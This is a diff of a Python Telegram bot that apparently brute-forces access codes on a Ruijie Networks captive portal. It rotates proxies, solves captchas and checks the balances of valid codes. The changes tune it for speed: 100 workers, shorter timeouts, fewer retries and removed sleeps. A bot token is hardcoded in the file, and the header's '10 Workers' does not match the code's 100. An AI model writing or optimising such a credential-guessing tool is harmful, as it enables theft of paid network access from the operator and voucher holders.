@@ -1,7 +1,7 @@
 # -*- coding: utf-8 -*-
 # =====================================================================================
 #  sirzipp.py — FINAL VERSION
-#  Dashboard Timeout Fix + 10s Update + Infinite Scan
+#  Speed Optimized (10 Workers) + Infinite Scan + CURRENT_CODE Fix
 # =====================================================================================
 
 import os
@@ -31,9 +31,9 @@ BOT_TOKEN = "8810710930:AAFf_yQc4WBJlVk9nk9yDQuJsqfyjCGOVL8"
 PORTAL_URL_PATH = "portal_url_"
 PROXY_FILE = "proxies.txt"
 MAX_CODES_PER_SESSION = 999999999
-MAX_CODES_PER_SID = 999999
-NUM_WORKERS = 50
-TIMEOUT_SEC = 30
+MAX_CODES_PER_SID = 500           # ⭐ SID အသစ် မြန်မြန်ရှာ
+NUM_WORKERS = 100                  # ⭐ Worker 10 ခု
+TIMEOUT_SEC = 15                   # ⭐ Timeout ၁၅ စက္ကန့်
 
 ADMIN_IDS = [6537847588]
 
@@ -212,7 +212,7 @@ async def get_sid_from_gateway(session, portal_url, user_id, proxy=None):
 
 # ── BALANCE ──────────────────────────────────────────────────────────────────
 
-async def fetch_balance(active_token, code, retries=5, proxy=None):
+async def fetch_balance(active_token, code, retries=3, proxy=None):
     url = BALANCE_URL + active_token + "?lang=en_US"
     headers = {
         "authority": "portal-as.ruijienetworks.com",
@@ -268,7 +268,7 @@ async def fetch_balance(active_token, code, retries=5, proxy=None):
     return "N/A"
 
 
-# ── CHECK SINGLE CODE ────────────────────────────────────────────────────────
+# ── CHECK SINGLE CODE (Optimized) ────────────────────────────────────────────
 
 async def check_single_access_code(session, code, current_session_id,
                                    login_url, captcha_base_url, verify_url,
@@ -329,12 +329,12 @@ async def check_single_access_code(session, code, current_session_id,
             ud["stats"]["limit_codes"].append(code)
             return
         retry_count += 1
-        if retry_count >= 3:
+        if retry_count >= 2:   # ⭐ Retry ၂ ခါပဲ
             return
-        await asyncio.sleep(0.01)
+        await asyncio.sleep(0.001)
 
 
-# ── WORKER ───────────────────────────────────────────────────────────────────
+# ── WORKER (Optimized - No Sleep) ────────────────────────────────────────────
 
 async def worker(worker_id, login_url, captcha_base_url, verify_url, headers, user_id):
     ud = get_user_data(user_id)
@@ -357,11 +357,11 @@ async def worker(worker_id, login_url, captcha_base_url, verify_url, headers, us
                         sid_failures = 0
                     else:
                         sid_failures += 1
-                        if sid_failures >= 50:
-                            await asyncio.sleep(5)
+                        if sid_failures >= 20:
+                            await asyncio.sleep(2)
                             sid_failures = 0
                             continue
-                        await asyncio.sleep(1)
+                        await asyncio.sleep(0.5)
                         continue
                 if ud["stop_event"].is_set():
                     break
@@ -376,7 +376,7 @@ async def worker(worker_id, login_url, captcha_base_url, verify_url, headers, us
                     continue
                 ud["stats"]["tried_codes"].add(code)
                 ud["CURRENT_CODE"] = code
-                await asyncio.sleep(0.001)
+                # ⭐ sleep ဖျက်လိုက်ပါပြီ
                 await check_single_access_code(session, code, current_session_id,
                                                login_url, captcha_base_url,
                                                verify_url, headers, user_id, proxy=proxy)
@@ -421,7 +421,6 @@ async def run_user_scanner(context, user_id):
             if all(t.done() for t in worker_tasks):
                 break
 
-            # ⭐ ၁၀ စက္ကန့်တစ်ခါ Update
             if time.time() - last_update >= 10:
                 last_update = time.time()
                 stats = ud["stats"]
@@ -449,7 +448,6 @@ async def run_user_scanner(context, user_id):
                         "\n━━━━━━━━━━━━━━━━━\n🔥 Last: " + last_log)
                 keyboard = [[InlineKeyboardButton("🛑 Stop", callback_data="stop_scan")]]
                 try:
-                    # ⭐ Timeout 30 စက္ကန့်
                     await asyncio.wait_for(
                         context.bot.edit_message_text(
                             chat_id=user_id, message_id=ud["dash_msg_id"],
